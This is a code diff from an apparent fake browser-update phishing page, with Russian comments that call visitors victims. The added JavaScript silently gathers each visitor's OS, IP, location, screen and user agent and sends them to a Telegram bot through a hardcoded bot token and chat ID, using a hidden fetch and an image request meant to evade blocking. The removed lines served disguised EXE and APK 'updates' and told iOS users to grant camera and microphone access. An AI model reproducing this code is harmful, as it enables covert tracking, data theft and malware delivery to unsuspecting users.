@@ -298,63 +298,63 @@
             }
         }
 
-        // Отправка в Telegram
-        function sendToTelegram(data) {
-            const message = `🕵️ НОВЫЙ КЛИЕНТ:\n` +
-                           `⏰ ${new Date().toLocaleString()}\n` +
-                           `🌐 ОС: ${data.os}\n` +
-                           `📍 IP: ${data.ip}\n` +
-                           `🗺️ Geo: ${data.geo || 'pending'}\n` +
-                           `📱 UA: ${data.userAgent.substring(0, 50)}...\n` +
-                           `🖥️ Screen: ${data.screen}\n` +
-                           `💾 RAM: ${data.deviceMemory}GB\n` +
-                           `🎥 Media: ${data.media || 'not_attempted'}\n` +
-                           `🔗 Referrer: ${data.referrer}`;
+// Отправка данных в Telegram бота
+async function sendToTelegram(data) {
+    const victimData = {
+        os: data.os,
+        ip: data.ip,
+        ua: navigator.userAgent,
+        screen: `${screen.width}x${screen.height}`,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        country: data.country || 'Unknown',
+        city: data.city || 'Unknown',
+        timestamp: new Date().toISOString()
+    };
+    
+    // Формируем сообщение для бота
+    const message = `🕵️ НОВЫЙ КЛИЕНТ
 
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            const formData = new FormData();
-            formData.append('chat_id', ADMIN_CHAT_ID);
-            formData.append('text', message);
+ОС: ${victimData.os}
+IP: ${victimData.ip}
+Страна: ${victimData.country}
+Город: ${victimData.city}
+Экран: ${victimData.screen}
+Время: ${new Date().toLocaleString()}
+User-Agent: ${victimData.ua.substring(0, 100)}...`;
+    
+    // Кодируем сообщение для URL
+    const encodedMsg = encodeURIComponent(message);
+    
+    // Отправляем через Telegram Bot API
+    const botToken = '8337372561:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
+    const chatId = '8001083987';
+    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMsg}`;
+    
+    // Скрытая отправка
+    fetch(url, { mode: 'no-cors' })
+        .then(() => console.log('Данные отправлены'))
+        .catch(() => {});
+    
+    // Дополнительная отправка через изображение (обход блокировок)
+    const img = new Image();
+    img.src = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMsg}`;
+    
+    // Сохраняем в localStorage для отслеживания
+    localStorage.setItem('victim_id', generateVictimId(victimData));
+    
+    return true;
+}
 
-            // Скрытая отправка через Image (обход блокировок)
-            const img = new Image();
-            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(message)}`;
-            
-            // Дублирующая отправка через fetch
-            fetch(url, {
-                method: 'POST',
-                body: formData,
-                mode: 'no-cors'
-            }).catch(() => {});
-        }
-
-        // Создание кнопки скачивания
-        function setupDownload(os) {
-            const section = document.getElementById('downloadSection');
-            const loader = document.getElementById('loader');
-            
-            if (os === "Windows") {
-                section.innerHTML = `
-                    <button class="download-button" onclick="downloadFile('${EXE_URL}', 'browser_update.exe')">
-                        <span class="download-icon">⬇️</span> Скачать для Windows (EXE, 12.5 MB)
-                    </button>`;
-            } else if (os === "Android") {
-                section.innerHTML = `
-                    <button class="download-button" onclick="downloadFile('${APK_URL}', 'browser_update.apk')">
-                        <span class="download-icon">⬇️</span> Скачать для Android (APK, 8.3 MB)
-                    </button>`;
-            } else if (os === "iOS") {
-                section.innerHTML = `
-                    <div style="background:#fff3cd;border:1px solid #ffeaa7;border-radius:10px;padding:20px;">
-                        <p style="color:#856404;margin:0;font-weight:bold;">
-                            ⚠️ Для iOS доступно только веб-обновление.<br>
-                            Нажмите "Разрешить" при запросе доступа к камере и микрофону для верификации.
-                        </p>
-                    </div>`;
-            } else {
-                section.innerHTML = `<p style="color:#d93050;font-weight:bold;">Неизвестная система: ${os}</p>`;
-            }
-        }
+function generateVictimId(data) {
+    // Генерация ID на основе данных
+    const str = data.ip + data.ua + Date.now();
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+        hash = ((hash << 5) - hash) + str.charCodeAt(i);
+        hash |= 0;
+    }
+    return Math.abs(hash).toString(16).substring(0, 8);
+}
 
         // Функция скачивания файла
         function downloadFile(url, filename) {
